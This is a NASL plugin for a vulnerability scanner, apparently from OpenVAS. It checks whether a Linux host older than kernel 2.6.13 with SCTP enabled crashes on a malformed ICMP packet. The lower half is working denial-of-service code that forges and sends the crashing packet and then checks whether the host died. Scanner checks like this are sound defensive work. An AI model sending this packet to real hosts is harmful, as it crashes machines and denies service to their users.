# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19777");
  script_version("2024-06-26T05:05:39+0000");
  script_tag(name:"last_modification", value:"2024-06-26 05:05:39 +0000 (Wed, 26 Jun 2024)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:C/A:N");
  script_name("Malformed ICMP Packets May Cause a Denial of Service (SCTP)");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("global_settings.nasl", "os_detection.nasl");
  script_exclude_keys("keys/TARGET_IS_IPV6");
  script_mandatory_keys("Host/runs_unixoide");

  script_xref(name:"URL", value:"https://web.archive.org/web/20060718224254/http://oss.sgi.com/projects/netdev/archive/2005-07/msg00142.html");

  script_tag(name:"solution", value:"Update to Linux 2.6.13 or newer, or disable SCTP support.");

  script_tag(name:"summary", value:"It is possible to crash the remote host by sending it malformed ICMP packets.");

  script_tag(name:"insight", value:"Linux Kernels older than version 2.6.13 contains a bug which may allow an
  attacker to cause a NULL pointer dereference by sending malformed ICMP packets, thus resulting in a kernel panic.

  This flaw is present only if SCTP support is enabled on the remote host.");

  script_tag(name:"impact", value:"An attacker to make this host crash continuously, thus preventing legitimate
  users from using it.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

# Ensure that the host is still up
start_denial();
sleep( 2 );
up = end_denial();
if( ! up )
  exit( 0 );

start_denial();

src = this_host();
dst = get_host_ip();
id = rand();

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0xC0, ip_off: 0,
                     ip_p:IPPROTO_ICMP, ip_id: id, ip_ttl:0x40,
                     ip_src:this_host());
ip2 = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
                      ip_p: 132, ip_id: id+1, ip_ttl:0x40,
                      ip_src:this_host(),
                      data: '\x28\x00\x00\x50\x00\x00\x00\x00\xf9\x57\x1F\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00');
icmp = forge_icmp_packet(ip:ip, icmp_type: 3, icmp_code:2,
                         icmp_seq: 0, icmp_id: 0, data: ip2);
send_packet(icmp, pcap_active: FALSE);

alive = end_denial();
if(!alive) {
  security_message(port:0, proto:"icmp");
  set_kb_item( name:"Host/dead", value:TRUE );
}
